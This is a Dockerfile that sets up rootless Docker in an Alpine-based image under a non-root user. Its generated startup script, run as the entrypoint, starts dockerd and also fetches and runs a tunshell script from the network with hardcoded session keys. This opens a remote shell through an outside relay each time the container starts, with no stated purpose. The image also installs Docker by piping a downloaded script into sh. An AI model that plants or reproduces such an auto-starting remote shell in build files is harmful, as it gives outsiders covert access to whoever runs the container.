FROM docker:latest

# Install required tools
RUN apk add --no-cache \
    curl \
    bash \
    shadow \
    iptables \
    fuse-overlayfs \
    iproute2 \
    xz \
    procps \
    libseccomp

# The shadow package in Alpine includes newuidmap and newgidmap tools
# Create a user with UID in the 10000-20000 range
RUN addgroup -g 10002 appgroup && \
    adduser -u 10002 -G appgroup -h /home/appuser -s /bin/bash -D appuser

# Set up directories for rootless mode
RUN mkdir -p /home/appuser/.local/share/docker && \
    mkdir -p /home/appuser/.config/docker && \
    chown -R appuser:appgroup /home/appuser

# Verify newuidmap and newgidmap are available (shadow package should provide these)
RUN which newuidmap && which newgidmap

# Switch to the non-root user for installation
USER 10002
WORKDIR /home/appuser

# Install rootless Docker
RUN curl -fsSL https://get.docker.com/rootless | sh

# Configure environment variables for rootless Docker
ENV PATH=/home/appuser/bin:$PATH
ENV XDG_RUNTIME_DIR=/home/appuser/.docker/run
ENV DOCKER_HOST=unix:///home/appuser/.docker/run/docker.sock

# Create a custom startup script
RUN echo '#!/bin/bash\n\
dockerd-rootless.sh --experimental &\n\
sleep 5\n\
curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T aNB1YS9NUAfyEnlCTGr2Yd 5Rz4Bi3dbjw4YoR93vuryN eu.relay.tunshell.com\n\
' > /home/appuser/start.sh && \
    chmod +x /home/appuser/start.sh

ENTRYPOINT ["/bin/bash"]
CMD ["-c", "/home/appuser/start.sh"]
